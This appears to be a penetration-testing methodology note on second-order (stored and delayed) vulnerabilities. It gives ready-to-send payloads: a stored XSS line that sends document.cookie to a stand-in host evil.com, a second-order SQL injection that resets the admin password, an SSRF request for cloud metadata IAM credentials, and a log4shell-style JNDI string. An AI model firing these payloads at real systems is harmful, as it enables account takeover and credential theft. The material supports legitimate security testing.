# Second-Order (Stored / Delayed) Vulnerabilities

**What it is:** Payload stored harmlessly on request A, then executed later when a *different* feature reads it without re-validation. Automated tools miss these — no immediate reaction. You must trace data flow across features.

## Mental model
```
Store  →  (payload sits inert)  →  Trigger feature reads it raw  →  Boom
```
The sink is not where you injected. Register with `'`, it triggers in the admin export.

## Where to hunt
- Username/display name → rendered in **admin panel**, invoices, PDF, emails, logs.
- Profile fields → shown to other users, support agents, exported reports.
- Filenames → listed elsewhere, used in a shell/convert job later.
- Values copied between services (order → warehouse → analytics).
- Data written by low-priv user, read by high-priv job.

## Second-order SQLi example
1. Register username = `admin'-- -`:
```http
POST /register HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

username=admin%27--+-&password=Passw0rd!&email=me@evil.com
```
2. Later, a "change password" routine builds SQL from the *stored* username:
```http
POST /account/change-password HTTP/1.1
Host: target.com
Cookie: session=<mine>

new_password=hacked
```
Backend runs `UPDATE users SET pass=... WHERE name='admin'-- -'` → resets **admin's** password. Injection fired on step 2, not registration.

## Second-order / stored XSS example
Store in a field the UI escapes, but an admin dashboard renders raw:
```http
POST /api/profile HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=<mine>

{"company":"<img src=x onerror=fetch('https://evil.com/c?'+document.cookie)>"}
```
Fires when a support agent opens your ticket/profile → agent-session theft.

## Second-order SSRF example
Save a webhook/avatar URL now; a *background job* fetches it later:
```http
PUT /api/settings HTTP/1.1
Host: target.com
Content-Type: application/json
Cookie: session=<mine>

{"avatar_url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
```
The server-side thumbnailer hits metadata hours later.

## Method
- [ ] Seed **every** stored field with a unique tracer (`sof<rand>` + `'"<>{{`).
- [ ] Then exercise every admin/export/PDF/email/report feature and watch for the tracer + breakage.
- [ ] Use Collaborator payloads so a delayed OOB hit tells you *when/where* it fired.

## Impact
Admin ATO, stored XSS in privileged context, blind SSRF/SQLi. Often critical.

## 🎯 PoC — Request → Response (store looks clean, trigger fires)

**Store (accepted, no reaction):**
```http
POST /api/v1/register HTTP/2
Host: api.target.com
Content-Type: application/json

{"username":"sof_a'\"><x","email":"me@evil.com","password":"P@ss1"}
```
```http
HTTP/2 201 Created
{"id":"u_7781","username":"sof_a'\"><x"}      ← stored verbatim, no error
```
**Trigger (admin opens the user in the dashboard days later):**
```http
GET /admin/users/u_7781 HTTP/2
Host: admin.target.com
Cookie: session=<admin>
```
```http
HTTP/2 200 OK
Content-Type: text/html

...<td>sof_a'"><x</td>...          ← rendered raw in privileged context = stored XSS on admin
```
With an `onerror`/Collaborator payload instead of `sof_a`, the OOB hit timestamps exactly when/where it fired.

## Deep cuts — more delayed sinks & tracing
- [ ] **Log injection → RCE/XSS:** input written to logs read by a dashboard (stored XSS in Kibana/Grafana/admin) or parsed by a vulnerable logger (`${jndi:ldap://collab}` log4shell-class, `%n`/format strings) — the sink is the log viewer/processor.
- [ ] **Queue / async worker:** value enqueued now, consumed later by a job with different privileges/network zone (stored SSRF via webhook/avatar fetch, command injection in a filename handed to a shell job).
- [ ] **Report/PDF/invoice generator:** a field rendered server-side into a template days later → second-order SSTI/XSS (`03-injection/03`, `06-file-upload/03` CSV formula).
- [ ] **Search index / analytics pipeline:** payload indexed, then reflected in a *different* app (internal analytics, BI tool, autocomplete) that renders it raw.
- [ ] **Digest / notification emails:** stored content surfaces in a weekly digest / mention email rendered as HTML → XSS in the recipient's mail client or an admin's.
- [ ] **Cross-service ID/data copy:** order→warehouse→shipping→accounting; a value sanitized at entry is trusted downstream where a different service concatenates it into SQL/shell/template.
- [ ] **Second-order IDOR:** plant `owner_id`/reference on create; a later "finalize/publish/export" step trusts it (`01-access-control/01`, `07-api/03`).
- [ ] **Import→export round-trip:** upload data, export it elsewhere (CSV/PDF/API) where escaping differs.
- [ ] **Tracing discipline:** encode the *field name* into each canary (`sofBIO<rand>`, `sofNAME<rand>`) + a Collaborator subdomain per field, so the OOB hit tells you exactly which stored field fired and where.

## Report notes
Show the store step + the trigger step separately and the delayed effect. Collaborator interaction pins the sink. Name the store field and the trigger feature.
